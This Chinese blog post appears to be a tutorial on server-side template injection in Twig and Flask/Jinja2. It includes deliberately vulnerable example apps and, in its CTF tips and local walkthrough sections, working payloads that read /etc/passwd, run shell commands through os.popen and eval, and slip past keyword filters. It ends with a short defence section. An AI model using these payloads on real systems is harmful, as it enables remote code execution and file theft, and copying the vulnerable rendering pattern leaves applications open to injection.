+<p>好处：不占用服务端运算资源（解析模板），模板在前端（很有可能仅部分在前端），改结构变交互都前端自己来了，改完自己调就行。不用麻烦后端再联调神马的。  </p>
+<p>坏处：占用（一部分、少部分）客户端运算资源（解析模板）。前端代码多点，毕竟包含模板代码了么。脚本是不是首次下就慢点了（看你在意不在意这个毕竟能304和CDN啥的）。可能造成前后两份模板的情况，总归要后端吐出个首屏啥的先让用户看见吧。那这部分页面模板不就是后端拼好了吐出来的么。</p>
+<p>示例1：定义一个模板，例如</p>
+<pre><code>&lt;html&gt;
+&lt;div&gt;{$what}&lt;/div&gt;
+&lt;/html&gt;</code></pre><p>这只是一个模板。{$what}是数据。此时不知道数据是什么。</p>
+<pre><code>如果我想html里面成为
+&lt;div&gt;peiqi&lt;/div&gt;
+渲染到html代码里</code></pre><p>渲染完成后</p>
+<pre><code>&lt;html&gt;
+&lt;div&gt;peiqi&lt;/div&gt;
+&lt;/html&gt;</code></pre><p>当然这只是最简答的例子；<br>一般来说，至少会提供分支，迭代。还有一些内置函数，如格式化等等<br>那么 {$what}这个数据如何代码传入。<br>比如我工作用的模板引擎是smarty<br>我定义了一个模板。  </p>
+<pre><code>&lt;html&gt;
+&lt;div&gt;{$what}&lt;/div&gt;
+&lt;/html&gt;    </code></pre><p>js代码就是这么写就可以了</p>
+<pre><code>var tpl= new jSmart(tplStr);//tplStr就是模板的字符串。
+var content = &quot;Hello World&quot;;
+tpl.fetch({what:content});</code></pre><p>这样就可以了<br>其余的就交给引擎去渲染执行了。</p>
+<p>示例2：<br>模板：front.tpl</p>
+<pre><code>&lt;div&gt;
+{%$a%}
+&lt;/div&gt;</code></pre><p>后端：</p>
+<p>设置变量：$smarty-&gt;assign(‘a’, ‘give data’);<br>展示模板：$smarty-&gt;display(“front.tpl”);<br>到前端时是渲染好的html串：</p>
+<pre><code>&lt;div&gt;
+give data
+&lt;/div&gt;</code></pre><p>这种方式的特点是展示数据快，直接后端拼装好数据与模板，展现到用户面前。</p>
+<h1 id="为什么需要服务器模板"><a href="#为什么需要服务器模板" class="headerlink" title="为什么需要服务器模板"></a>为什么需要服务器模板</h1><p>首先解释一下为什么HTML代码和应用程序逻辑混合在一起不好，看下面的例子你就知道了。假如你使用下面的代码为你的用户提供服务：</p>
+<p><img src="http://a1.qpic.cn/psb?/V14K5DCn3C6bNV/zuZGaJU3ir7FWgwJ5LL1uuMe8Nr3bCRqSYxBrP8rS*A!/b/dDQBAAAAAAAA&ek=1&kp=1&pt=0&bo=ygG2AAAAAAARF10!&tl=3&vuin=275640346&tm=1542081600&sce=60-2-2&rf=viewer_4" alt></p>
+<p>这不仅仅是静态HTML代码。用户名是从cookie里获取并且自动填写的。这样一来，只要你之前登录过该网站，你就无需再次输入。但是这有一个问题，那就是你必须通过某种形式将值插入到HTML文档中，有两种方法可以实现，一种是正确的，一种是有危害的。不过我们要先问一下，为什么要这么做。<br>下图展示了解决该问题的完全错误的方法：<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/.EL6oFhItl9HOx2INzFAMkjTMI2qQ5sAdHpuzf8JpQ0!/b/dFQBAAAAAAAA&bo=9QJAAQAAAAARF5Y!&rf=viewer_4" alt></p>
+<p>这段代码有很多问题，作者不仅仅没有对用户的输入进行处理，HTML代码和PHP代码复杂的混合在一起，非常难以理解。部分HTML代码分布在多个函数中，这还不算什么，当你尝试修改HTML代码中任何内容时，你才发现有多难受，比如新增css类或修改HTML标签的顺序。</p>
+<p>上面这个例子显然是有意写的这么烂的，不过可以通过格式化进行优化。然而，在大型的代码库中，即使代码格式良好，也会很快变得无法管理。这就是为什么我们需要模板。</p>
+<p>与上面混乱的代码相比，服务器端模板提供了一种更加简单的方法来管理动态生成的HTML代码。最大的优点就是你可以在服务器端动态生成HTML页面，看起来跟静态HTML页面一样。现在我们来看看，当我们使用服务器端模板时，复杂的代码看起来如何。</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/eHiQvxRwHidBs8twbzEB3VUMscrXRF0NH7eK2ukrDSE!/b/dDABAAAAAAAA&bo=EwLIAAAAAAARF*k!&rf=viewer_4" alt></p>
+<p>这对前面的代码做了一些优化，它依然是静态的。为了显示正确的信息而不是大括号占位符，我们需要一个替换它们的模板引擎。后端代码可能是这样的。<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/aZkd5oTVYo0RbjD0*vftwABvX6JE5KiLf*IrjrjsGc8!/b/dDIBAAAAAAAA&bo=iwF7AAAAAAARF9E!&rf=viewer_4" alt></p>
+<p>这段代码的意思非常清楚，首先加载login.tpl模板文件，然后对与模板中名称相同的变量赋值（大括号里的变量），然后调用show()函数，相应的替换它们的内容并输出HTML代码。然而，我们在模板中增加了新的功能，这将会向用户展示模板渲染的时间。</p>
+<h1 id="什么是服务端模板注入"><a href="#什么是服务端模板注入" class="headerlink" title="什么是服务端模板注入"></a>什么是服务端模板注入</h1><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。就拿一个销售软件来说，我们假设它会发送大量的邮件给客户，并在每封邮件前SKE插入问候语，它会通过Twig（一个模板引擎）做如下处理：</p>
+<p>$output = $twig-&gt;render( $_GET[‘custom_email’] , array(“first_name” =&gt; $user.first_name) );<br>有经验的读者可能迅速发现 XSS，但是问题不止如此。这行代码其实有更深层次的隐患，假设我们发送如下请求：</p>
+<pre><code>custom_email={{7*7}} // GET 参数
+
+49  // $output 结果
+还有更神奇的结果：
+
+custom_email={{self}} // GET 参数
+
+Object of class
+__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // 错误</code></pre><p>我们不难猜到服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p>
+<p>为什么我们在模板注入前加“服务端”呢？这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。</p>
+<h1 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h1><pre><code>&lt;?php
+require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;
+Twig_Autoloader::register(true);
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值
+echo $output;
+?&gt;</code></pre><p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。</p>
+<p>显然这段代码并没有什么问题，即使你想通过 name 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，</p>
+<p>但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击：<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/rV6n9sC3CNsxf9et5mL08q*ADfAQ*mciWbswTxH.bRM!/b/dFIBAAAAAAAA&bo=5gXkAQAAAAADFzQ!&rf=viewer_4" alt></p>
+<p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
+<pre><code>&lt;?php
+require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;
+Twig_Autoloader::register(true);
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分
+echo $output;    
+?&gt;</code></pre><p><img src="http://a3.qpic.cn/psb?/V14K5DCn3C6bNV/klIjDTuXdvK2WHYLBnbwdGGPm2A*rf.7MMxdNmbpv.U!/b/dDYBAAAAAAAA&ek=1&kp=1&pt=0&bo=5AQ.AgAAAAADF.4!&tl=1&vuin=275640346&tm=1542027600&sce=60-2-2&rf=viewer_4" alt><br>上面这段代码在构建模版时,拼接了用户输入作为模板的内容,现在如果再向服务端直接传递 JavaScript 代码,用户输入会原样输出,测试结果显而易见。</p>
+<p>在 Twig 模板引擎里,   除了可以输出传递的变量以外,还能执行一些基本的表达式然后将其结果作为该模板变量的值,例如这里用户输入 name=20 ,则在服务端拼接的模版内容为:</p>
+<p><img src="http://a4.qpic.cn/psb?/V14K5DCn3C6bNV/Y0Oac1o2cQOAu0NM7nmuBXjeipvhOME0Wb.beSH251A!/b/dDcBAAAAAAAA&ek=1&kp=1&pt=0&bo=AATQAAAAAAADF.Y!&tl=1&vuin=275640346&tm=1542027600&sce=60-3-3&rf=viewer_4" alt></p>
+<p>这里简单分析一下,由于   作为 Twig 模板引擎的默认注释形式,所以在前端输出的时候并不会显示,而 16  作为模板变量最终会返回 16  作为其值进行显示,因此前端最终会返回内容 Hello IsVuln16OK ,如下图:</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/NUgdkGbd66DvHoR1MVaeOnymKCggCA74kQAZK9IPUlM!/b/dDYBAAAAAAAA&bo=AAQ.AQAAAAADJzk!&rf=viewer_4" alt></p>
+<h1 id="漏洞发掘"><a href="#漏洞发掘" class="headerlink" title="漏洞发掘"></a>漏洞发掘</h1><p>每一个（重）模板引擎都有着自己的语法（点）,Payload 的构造需要针对各类模板引擎制定其不同的扫描规则,就如同 SQL 注入中有着不同的数据库类型一样。</p>
+<p>简单来说,就是更改请求参数使之承载含有模板引擎语法的 Payload,通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析,有解析则可以判定含有 Payload 对应模板引擎注入,否则不存在 SSTI。</p>
+<p>模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload：</p>
+<pre><code>smarty=Hello ${7*7}
+Hello 49
+
+freemarker=Hello ${7*7}
+Hello 49</code></pre><p>来确认漏洞。</p>
+<p>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p>
+<pre><code>personal_greeting=username
+Hello user01</code></pre><p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：</p>
+<pre><code>personal_greeting=username&lt;tag&gt;
+Hello
+personal_greeting=username}}&lt;tag&gt;
+Hello user01 &lt;tag&gt;</code></pre><p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
+<pre><code>&lt;?php
+require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;
+Twig_Autoloader::register(true);
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分
+echo $output;    
+?&gt;</code></pre><p>上面这段代码在构建模版时,拼接了用户输入作为模板的内容,现在如果再向服务端直接传递 JavaScript 代码,用户输入会原样输出,测试结果显而易见。</p>
+<h1 id="模板引擎注入"><a href="#模板引擎注入" class="headerlink" title="模板引擎注入"></a>模板引擎注入</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p>
+<p>一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig，模板注入是一种注入攻击，可以产生一些特别有趣的影响。对于AngularJS的情况，这可能意味着XSS，并且在服务器端注入的情况下可能意味着远程代码执行。  </p>
+<p>重点来了，不同引擎有不同的测试以及注入方式！</p>
+<h1 id="flask-jinja2模板注入"><a href="#flask-jinja2模板注入" class="headerlink" title="flask/jinja2模板注入"></a>flask/jinja2模板注入</h1><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 </p>
+<p>Flask框架中提供的模版引擎可能会被一些无量开发者利用引入一个服务端模版注入漏洞，如果对此感到有些困惑可以看看James Kettle在黑帽大会中分享的议题(PDF)，简而言之这个漏洞允许将语言/语法注入到模板中。在服务器的context中执行这个输入重现，根据应用的context可能导致任意远程代码执行(远端控制设备)<br>可以参考本博客文章 Flask从零到无 。<br>这里给出一个漏洞环境代码，本地测试</p>
+<pre><code>from flask import Flask
+from flask import render_template
+from flask import request
+from flask import render_template_string
+
+app = Flask(__name__)
+@app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+def test():
+    template = &apos;&apos;&apos;
+        &lt;div class=&quot;center-content error&quot;&gt;
+            &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;
+            &lt;h3&gt;%s&lt;/h3&gt;
+        &lt;/div&gt; 
+    &apos;&apos;&apos; %(request.url)
+
+    return render_template_string(template)
+
+if __name__ == &apos;__main__&apos;:
+    app.debug = True
+    app.run()</code></pre><p>代码简析： 我们自己简单写一个string类型的 html，html返回当前url，我们放入到渲染函数render_template_string进行渲染，然后页面会打印出当前url，如果url里含有｛｝那么便可以进行模板注入。</p>
+<p>测试url </p>
+<pre><code>http://127.0.0.1:5000/test?{{config}}  </code></pre><p>测试结果如下：<br><img src="https://i.imgur.com/L0UPxs9.png" alt></p>
+<p>而如果我们使用render_template函数，</p>
+<pre><code>@app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+@app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#我们访问/或者/index都会跳转
+def index():
+   return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;))</code></pre><p>index.html</p>
+<pre><code>&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+      &lt;h1&gt;Hello, {{user}}!&lt;/h1&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>那么将不会有模板注入，因为render_template已经传入一个固定好了的模板，没法再去修改，在渲染之后传入数据，只有当第一种代码，我们模板可控的时候，先传入后渲染，这样才会导致ssti模板注入。</p>
+<h2 id="ctf-tips"><a href="#ctf-tips" class="headerlink" title="ctf tips"></a>ctf tips</h2><p>1.那么实战ctf中如何利用呢，无非是读取文件或者getshell，</p>
+<p>Python中有一个 .<strong>class</strong> 可以获取实例对应的类，比如一个空字符串 “”.<strong>class</strong>就可以获取到 &lt;type’str’&gt; ，那这个字符串同样也可以换成列表，元组，字典。 “”同样可以换成元组，列表等。</p>
+<pre><code>print ().__class__.__bases__[0]
+&lt;type &apos;object&apos;&gt;</code></pre><p>可以看到元组的父类为object类，object是所有类的超类，而他之下又有很多方法可以调用，包括file 读取，system os等方法，我们再查看他之下的方法，然后找到对应的位置去调用。重点是将boject类找到，然后subclasses找他的方法，再从方法中找到合适的来读取或执行命令。如下poc，</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()</code></pre><p><img src="https://i.imgur.com/gYtrssG.png" alt></p>
+<p>因为().<strong>class</strong>.bases__为object类，所以我们直接subclasses查找方法，如果不是object类，则进一步base，().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()如下poc，</p>
+<pre><code>poc http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}</code></pre><p><img src="https://i.imgur.com/IjXOomg.png" alt></p>
+<p>已经找到了object类然后进行下一步方法利用就可以了。<br>从这些方法中选去可利用的进行下一步渗透。如第四十个为&lt;type ‘file’&gt;方法，我们调用方法读取poc：</p>
+<pre><code>http://127.0.0.1:5000/test?{{().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()}}</code></pre><p>2.执行命令poc </p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )
+
+object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)
+
+www.a.com/login.php{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}</code></pre><p><strong>init</strong>用于将对象实例化</p>
+<p>其他的利用方式无非都是这个格式，方法自己去寻找，</p>
+<p>3.绕过（参考<a href="https://p0sec.net/index.php/archives/120/）" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/）</a><br>ctf中不免有一些函数会被过滤，我们可以通过拼接字符串的方式来绕过<br>如 poc </p>
+<pre><code>object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)</code></pre><p>括号里的字符都可以通过’a’+’a’的方式来组合，组合后为aa，以此来绕过</p>
+<p>getattribute绕过</p>
+<p>我们想要的代码</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]</code></pre><p>进行关键字绕过</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_global&apos;+&apos;s&apos;)[&apos;linecache&apos;]</code></pre><p>两个不常见的执行任意命令的方法：</p>
+<p>import timeit<br>timeit.timeit(“<strong>import</strong>(‘os’).system(‘dir’)”,number=1)</p>
+<p>import platform<br>print platform.popen(‘dir’).read()</p>
+<p>走投无路时的poc <a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/</a></p>
+<p>参考文章：<a href="https://blog.csdn.net/iamsongyu/article/details/83109772" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/83109772</a><br>参考文章：<a href="https://www.freebuf.com/articles/web/88768.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/88768.html</a><br>参考文章：<a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p>
+<h2 id="flask本地实战讲解"><a href="#flask本地实战讲解" class="headerlink" title="flask本地实战讲解"></a>flask本地实战讲解</h2><p>环境 python3.6<br>模版  flask<br>引擎 jinja2<br>源码  </p>
+<pre><code>from flask import Flask
+from flask import render_template_string
+from flask import request
+app = Flask(__name__)
+@app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+def test():
+        template = &apos;&apos;&apos;
+            &lt;div class=&quot;center-content error&quot;&gt;
+            &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;
+            &lt;h3&gt;%s&lt;/h3&gt;
+        &lt;/div&gt; 
+    &apos;&apos;&apos; %(request.url)
+    return render_template_string(template)
+
+
+if __name__ == &apos;__main__&apos;:
+    app.run()</code></pre><p>1.先找object类，这里我们没采用常规的””.<strong>class</strong>而是用session[<strong>class</strong>]</p>
+<pre><code>http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}//至于这里为啥&apos;__cla&apos;+&apos;ss__&apos;是为了绕过一些过滤防患未然。</code></pre><p><img src="https://i.imgur.com/3U7o2lZ.png" alt><br>如图我们找到了object类，然后从中找我们熟悉的类再找函数，接下来我们subclasses找到所有的类，我们找熟悉的类 &lt;class ‘os._wrap_close’&gt;</p>
+<p><img src="https://i.imgur.com/B8NudVg.png" alt><br>查找查找回首掏，第118个<br><img src="https://i.imgur.com/WqQAEPJ.png" alt><br>常规.<strong>init</strong>.<strong>globals</strong><br><img src="https://i.imgur.com/JGrANw3.png" alt><br>找到popen函数，执行命令<br>最终poc </p>
+<pre><code>http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}</code></pre><p><img src="https://i.imgur.com/ynBodJp.png" alt><br>执行命令</p>
+<h1 id="PHP-模版引擎Twig注入"><a href="#PHP-模版引擎Twig注入" class="headerlink" title="PHP/模版引擎Twig注入"></a>PHP/模版引擎Twig注入</h1><p>参考：<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></p>
+<h1 id="CTF—模板注入"><a href="#CTF—模板注入" class="headerlink" title="CTF—模板注入"></a>CTF—模板注入</h1><p>tornado的一道 ssti</p>
+<p><a href="https://blog.csdn.net/cccccfive/article/details/83145669" target="_blank" rel="noopener">https://blog.csdn.net/cccccfive/article/details/83145669</a></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>为了防止此类漏洞，你应该像使用eval()函数一样处理字符串加载功能。尽可能加载静态模板文件。</p>
+<p>注意：我们已经确定此功能类似于require()函数调用。因此，你也应该防止本地文件包含（LFI）漏洞。不要允许用户控制此类文件或其内容的路径。</p>
+<p>另外，无论在何时，如果需要将动态数据传递给模板，不要直接在模板文件中执行，你可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。</p>
+<h1 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h1><h2 id><a href="#" class="headerlink" title></a><img src="http://a4.qpic.cn/psb?/V14K5DCn3C6bNV/lUdLHBc1bAjEHGvpbiUFtDo*mw2Agz*MFkWVuT030mc!/b/dFMBAAAAAAAA&ek=1&kp=1&pt=0&bo=3AJDAwAAAAADF6w!&tl=1&vuin=275640346&tm=1542258000&sce=60-2-2&rf=viewer_4" alt></h2><p>参考：<a href="https://www.anquanke.com/post/id/82856" target="_blank" rel="noopener">https://www.anquanke.com/post/id/82856</a><br>参考：<a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a><br>参考：<a href="https://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">https://www.cnblogs.com/tyomcat/p/5440488.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/11/SSTI模板注入/" data-id="ck0l0oh96000dpy2ioj8irwav" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
